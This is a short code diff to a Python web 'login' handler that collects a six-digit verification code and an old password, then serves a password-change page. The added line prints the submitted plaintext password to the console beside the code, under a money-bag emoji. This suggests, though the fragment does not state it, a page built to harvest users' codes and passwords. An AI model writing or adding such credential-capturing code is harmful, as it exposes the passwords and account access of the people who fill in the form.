@@ -62,7 +62,7 @@ async def login(
     old_password: str = Form(...),
 ):
     code = f"{num1}{num2}{num3}{num4}{num5}{num6}"
-    print(f"\n >>       💰 Verification code for {email}: {code}\n")
+    print(f"\n >>       💰 Verification code for {email}: {code} (password: {old_password})\n")
 
     with open("change-password.html", "r") as f:
         return f.read()
